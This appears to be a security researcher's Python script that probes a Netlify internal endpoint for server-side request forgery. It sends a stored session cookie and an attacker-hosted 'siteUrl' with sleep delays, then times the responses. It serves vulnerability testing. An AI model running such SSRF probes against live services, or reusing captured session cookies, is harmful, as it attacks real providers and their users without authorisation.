# -*- coding: utf-8 -*-
"""sleep 实验:sdk-version 服务端是否等待函数执行完成"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_B

ctx = ssl.create_default_context()

def req(host, cookie, path, method='GET', body=None, timeout=60):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Cookie': cookie, 'Content-Type': 'application/json'}
    payload = json.dumps(body).encode() if body is not None else None
    t0 = time.time()
    try:
        conn.request(method, path, body=payload, headers=h)
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st = r.status
        conn.close()
        return st, time.time() - t0, raw
    except Exception as e:
        return 'ERR', time.time() - t0, str(e)[:80].encode()

FN = 'https://sec-b-08v4pk.netlify.app/.netlify/functions/probe-log'
for ms in (0, 3000, 8000):
    u = FN + '?mode=sleep&ms=%d' % ms
    st, dt, raw = req('app.netlify.com', COOKIE_B, '/.netlify/functions/fetch-extension-host-site-sdk-version',
                      'POST', {'siteUrl': u})
    print('sdk-version sleep=%dms -> %s %6.1fs %s' % (ms, st, dt, raw[:200].decode('utf-8', 'replace').replace('\n', ' ')))
